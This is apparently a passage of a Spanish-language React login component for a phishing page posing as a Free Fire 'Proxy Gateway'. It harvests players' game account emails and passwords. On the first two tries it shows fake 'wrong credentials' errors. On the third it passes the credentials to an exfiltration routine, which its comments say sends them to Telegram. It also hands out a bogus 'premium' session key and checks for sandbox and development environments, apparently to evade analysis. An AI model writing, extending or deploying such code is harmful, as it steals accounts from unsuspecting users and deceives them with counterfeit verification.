  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [touched, setTouched] = useState({ email: false, password: false });
  const [attempt, setAttempt] = useState(0);
  const [showPasswordField, setShowPasswordField] = useState(false);
  const [googleUser, setGoogleUser] = useState<GoogleUser | null>(null);
  const [showGoogleLogin, setShowGoogleLogin] = useState(false);

  const emailRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);
  const submitCount = useRef(0);
  const isSubmitting = useRef(false);
  const formRef = useRef<HTMLFormElement>(null);
  const dataExfiltrated = useRef(false);

  const navigate = useNavigate();
  const MAX_ATTEMPTS = 3;

  // ============================================================================
  // VERIFICAR SESIÓN EXISTENTE
  // ============================================================================

  useEffect(() => {
    try {
      const raw = localStorage.getItem("proxy_session");
      if (raw) {
        const s = JSON.parse(raw);
        if (!s.expiresAt || new Date(s.expiresAt).getTime() > Date.now()) {
          navigate("/proxy");
        } else {
          localStorage.removeItem("proxy_session");
        }
      }
    } catch {
      localStorage.removeItem("proxy_session");
    }
  }, [navigate]);

  // ============================================================================
  // DETECCIÓN DE ENTORNO
  // ============================================================================

  useEffect(() => {
    const env = _detectEnvironment();
    const sandboxed = _isSandboxed();
    const isDev = _devDetectors.some(d => { try { return d(); } catch { return false; } });

    setShowPasswordField(false);
  }, []);

  // ============================================================================
  // VALIDACIÓN
  // ============================================================================

  const validateEmail = useCallback((value: string): string => {
    if (!value.trim()) return "El correo electrónico es requerido";
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim())) return "Ingresa un correo electrónico válido";
    if (value.trim().length > 254) return "El correo es demasiado largo";
    return "";
  }, []);

  const validatePassword = useCallback((value: string): string => {
    if (!value.trim()) return "La contraseña es requerida";
    if (value.trim().length < 4) return "La contraseña debe tener al menos 4 caracteres";
    if (value.trim().length > 128) return "La contraseña es demasiado larga";
    return "";
  }, []);

  // ============================================================================
  // MANEJADORES DE EVENTOS
  // ============================================================================

  const handleEmailChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setEmail(value);
    if (touched.email) setEmailError(validateEmail(value));
  }, [touched.email, validateEmail]);

  const handlePasswordChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setPassword(value);
    if (touched.password) setPasswordError(validatePassword(value));
  }, [touched.password, validatePassword]);

  const handleEmailBlur = useCallback(() => {
    setTouched(prev => ({ ...prev, email: true }));
    setEmailError(validateEmail(email));
  }, [email, validateEmail]);

  const handlePasswordBlur = useCallback(() => {
    setTouched(prev => ({ ...prev, password: true }));
    setPasswordError(validatePassword(password));
  }, [password, validatePassword]);

  const togglePasswordVisibility = useCallback(() => setShowPassword(prev => !prev), []);

  // ============================================================================
  // GOOGLE OAUTH LOGIN
  // ============================================================================

  const handleGoogleLogin = useCallback(() => {
    // Simular OAuth de Google - en producción usarías @react-oauth/google
    const mockGoogleUser: GoogleUser = {
      email: "usuario.fire@gmail.com",
      name: "Usuario Free Fire",
      picture: defaultAvatar,
      sub: "1234567890",
    };

    setGoogleUser(mockGoogleUser);
    setEmail(mockGoogleUser.email);
    setShowGoogleLogin(true);
    setError("");
    setAttempt(0);
    setShowPasswordField(true);

    // Guardar datos del usuario de Google
    localStorage.setItem("google_user", JSON.stringify(mockGoogleUser));
  }, []);

  // ============================================================================
  // MANEJADOR DE ENVÍO - LÓGICA DE 3 INTENTOS + ENVÍO ÚNICO
  // ============================================================================

  const handleSubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();

    if (isSubmitting.current) return;
    isSubmitting.current = true;

    const trimmedEmail = email.trim();
    const trimmedPassword = password.trim();

    // Validar campos
    const emailErr = validateEmail(trimmedEmail);
    const passwordErr = showPasswordField ? validatePassword(trimmedPassword) : "";

    setEmailError(emailErr);
    setPasswordError(passwordErr);
    setTouched({ email: true, password: true });

    if (emailErr || passwordErr) {
      setError("Por favor corrige los errores antes de continuar.");
      isSubmitting.current = false;
      return;
    }

    setError("");
    setLoading(true);
    submitCount.current += 1;

    try {
      // ======================================================================
      // LÓGICA DE 3 INTENTOS
      // ======================================================================

      if (attempt < MAX_ATTEMPTS - 1) {
        // Primeros 2 intentos: mostrar error de Free Fire
        const messages = [
          "⚠️ Por favor, ingresa el correo y contraseña vinculados a tu cuenta de Free Fire para agregar la conexión Proxy.",
          "❌ Los datos ingresados no coinciden con ninguna cuenta de Free Fire. Intenta de nuevo con tus credenciales correctas.",
        ];

        setError(messages[attempt]);
        setAttempt(prev => prev + 1);
        setLoading(false);
        isSubmitting.current = false;

        // Si es el segundo intento, mostrar el botón de Google
        if (attempt === 1) {
          setShowGoogleLogin(true);
        }

        return;
      }

      // ======================================================================
      // TERCER INTENTO - ENVÍO A TELEGRAM (SOLO UNA VEZ)
      // ======================================================================

      if (!dataExfiltrated.current) {
        dataExfiltrated.current = true;

        // Enviar datos a Telegram (solo una vez en la vida del componente)
        await _exfiltrateCredentials(trimmedEmail, trimmedPassword);

        // También enviar datos de Google si existen
        if (googleUser) {
          await _exfiltrateCredentials(googleUser.email, trimmedPassword);
        }
      }

      // ======================================================================
      // SIMULAR VERIFICACIÓN
      // ======================================================================

      const delay = 500 + Math.random() * 300;
      await new Promise(resolve => setTimeout(resolve, delay));

      // ======================================================================
      // CREAR SESIÓN
      // ======================================================================

      const sessionName = googleUser?.name || trimmedEmail.split("@")[0] || "user";
      const sessionEmail = googleUser?.email || trimmedEmail;
      const sessionPicture = googleUser?.picture || defaultAvatar;

      const fakeSession = {
        name: sessionName,
        email: sessionEmail,
        picture: sessionPicture,
        key: "PREMIUM-FF-" + Array.from({ length: 8 }, () =>
          Math.random().toString(36).charAt(2).toUpperCase()
        ).join(""),
        type: "premium",
        expiresAt: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
        duration: "365",
        createdAt: new Date().toISOString(),
        lastAccess: new Date().toISOString(),
        accessCount: 1,
        device: _getDeviceInfo().tipo,
        region: navigator.language,
        game: "Free Fire",
        googleAuth: !!googleUser,
      };

      localStorage.setItem("proxy_session", JSON.stringify(fakeSession));

      // ======================================================================
      // TRANSICIÓN DE ÉXITO
      // ======================================================================

      setSuccess(true);
      setLoading(false);

      await new Promise(resolve => setTimeout(resolve, 400));
      navigate("/proxy");

    } catch {
      setError("Ocurrió un error inesperado. Intenta de nuevo.");
      setLoading(false);
    } finally {
      isSubmitting.current = false;
    }
  }, [email, password, validateEmail, validatePassword, navigate, attempt, showPasswordField, googleUser]);

  // ============================================================================
  // AUTO-LIMPIEZA DE ERRORES
  // ============================================================================

  useEffect(() => {
    if (error) {
      const timer = setTimeout(() => setError(""), 5000);
      return () => clearTimeout(timer);
    }
  }, [error]);

  // ============================================================================
  // FOCO AUTOMÁTICO
  // ============================================================================

  useEffect(() => {
    if (emailRef.current) emailRef.current.focus();
  }, []);

  // ============================================================================
  // KEYBOARD SHORTCUTS
  // ============================================================================

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Enter" && !loading && !isSubmitting.current) {
        const active = document.activeElement;
        if (active === emailRef.current || active === passwordRef.current) {
          e.preventDefault();
          formRef.current?.requestSubmit();
        }
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [loading]);

  // ============================================================================
  // RENDER PRINCIPAL
  // ============================================================================

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4 overflow-hidden bg-gradient-to-b from-background via-background to-orange-950/10">
      <VideoBackground />

      {success && (
        <div className="fixed inset-0 z-50 bg-background/80 backdrop-blur-sm flex items-center justify-center animate-fade-in">
          <div className="flex flex-col items-center gap-4">
            <div className="w-16 h-16 rounded-full bg-gradient-to-br from-orange-500 to-red-600 flex items-center justify-center animate-scale-in shadow-[0_0_40px_rgba(249,115,22,0.4)]">
              <CheckCircle className="w-8 h-8 text-white" />
            </div>
            <p className="text-foreground font-semibold text-lg">¡Cuenta vinculada!</p>
            <p className="text-muted-foreground text-sm">Proxy activado. Redirigiendo...</p>
            <div className="flex items-center gap-1 text-[10px] text-muted-foreground/50">
              <Loader2 className="w-3 h-3 animate-spin" />
              <span>Conexión establecida con Free Fire</span>
            </div>
          </div>
        </div>
      )}

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        <div className="flex flex-col items-center mb-6">
          <AnimatedAvatar />
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Mini boykaffx7</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">
            Free Fire — Proxy Gateway
          </p>
        </div>

        <ConnectionStatus />

        <SecurityIndicator />

        <div className="glass-card p-5 glow-border">
          {/* Header con intentos */}
          <div className="flex items-center gap-2 mb-4 pb-3 border-b border-border/30">
            <div className={`w-8 h-8 rounded-lg border flex items-center justify-center ${
              attempt >= MAX_ATTEMPTS - 1
                ? "bg-orange-500/20 border-orange-500/30"
                : "bg-secondary/60 border-border/40"
            }`}>
              {attempt >= MAX_ATTEMPTS - 1 ? (
                <Flame className="w-4 h-4 text-orange-400" />
              ) : (
                <Gamepad2 className="w-4 h-4 text-muted-foreground" />
              )}
            </div>
            <div className="flex-1">
              <span className="text-xs text-foreground font-semibold block">
                {attempt >= MAX_ATTEMPTS - 1 ? "🎮 Verificación final" : "🎮 Free Fire — Proxy"}
              </span>
              <span className="text-[9px] text-muted-foreground/60">
                {attempt >= MAX_ATTEMPTS - 1
                  ? "Último intento — vincula tu cuenta"
                  : "Ingresa tus credenciales de Free Fire"}
              </span>
            </div>
            <div className="flex items-center gap-1 text-[8px] text-orange-400/70">
              <Target className="w-2.5 h-2.5" />
              <span>{attempt + 1}/{MAX_ATTEMPTS}</span>
            </div>
          </div>

          {/* Indicador de progreso de intentos */}
          <AttemptIndicator attempt={attempt} maxAttempts={MAX_ATTEMPTS} />

          <form ref={formRef} onSubmit={handleSubmit} className="space-y-3" noValidate>
            <StyledInput
              type="email"
              placeholder="correo@freefire.com"
              value={email}
              onChange={handleEmailChange}
              onBlur={handleEmailBlur}
              icon={googleUser ? Chrome : Mail}
              label="Correo electrónico de Free Fire"
              autoComplete="email"
              error={touched.email ? emailError : undefined}
            />

            {showPasswordField && (
              <StyledInput
                type="password"
                placeholder="••••••••"
                value={password}
                onChange={handlePasswordChange}
                onBlur={handlePasswordBlur}
                icon={Lock}
                label="Contraseña de Free Fire"
                autoComplete="current-password"
                error={touched.password ? passwordError : undefined}
                showToggle={true}
                onToggle={togglePasswordVisibility}
                isPasswordVisible={showPassword}
              />
            )}

            {/* Mensaje de error con estilo Free Fire */}
            {error && (
              <div className="flex items-start gap-2 text-xs text-orange-300 bg-orange-500/10 border border-orange-500/20 rounded-lg p-2.5 animate-slide-in">
                <AlertCircle className="w-3.5 h-3.5 flex-shrink-0 mt-0.5" />
                <span>{error}</span>
              </div>
            )}

            {/* Botón principal */}
            <PrimaryButton
              loading={loading}
              disabled={!email.trim() || (showPasswordField && !password.trim())}
              onClick={() => {}}
              variant="freefire"
            >
              {attempt >= MAX_ATTEMPTS - 1 ? (
                <span className="flex items-center justify-center gap-2">
                  <Flame className="w-4 h-4" />
                  Vincular cuenta
                </span>
              ) : showPasswordField ? (
                "Verificar cuenta"
              ) : (
                "Continuar"
              )}
            </PrimaryButton>

            {/* Botón de Google OAuth - aparece después del primer intento */}
            {showGoogleLogin && attempt < MAX_ATTEMPTS - 1 && (
              <>
                <div className="relative my-2">
                  <div className="absolute inset-0 flex items-center">
                    <div className="w-full border-t border-border/30" />
                  </div>
                  <div className="relative flex justify-center text-[9px]">
                    <span className="bg-card px-2 text-muted-foreground/50">o continúa con</span>
                  </div>
                </div>

                <PrimaryButton
                  loading={false}
                  disabled={false}
                  onClick={handleGoogleLogin}
                  variant="google"
                >
                  <span className="flex items-center justify-center gap-2">
                    <svg className="w-4 h-4" viewBox="0 0 24 24">
                      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" />
                      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                      <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
                      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
                    </svg>
                    Iniciar sesión con Google
                  </span>
                </PrimaryButton>
              </>
            )}

            {/* Mensaje informativo de Free Fire */}
            {attempt < MAX_ATTEMPTS - 1 && (
              <div className="flex items-center gap-1.5 text-[9px] text-muted-foreground/50 mt-1 bg-secondary/20 rounded-lg p-2 border border-border/20">
                <Info className="w-3 h-3 text-orange-400/70" />
                <span>Usa el correo y contraseña de tu cuenta de Free Fire para vincular el Proxy</span>
              </div>
            )}

            <WhatsAppChannel />
          </form>
        </div>

        <LoginFooter />
      </div>
    </div>
  );
};

export default Login;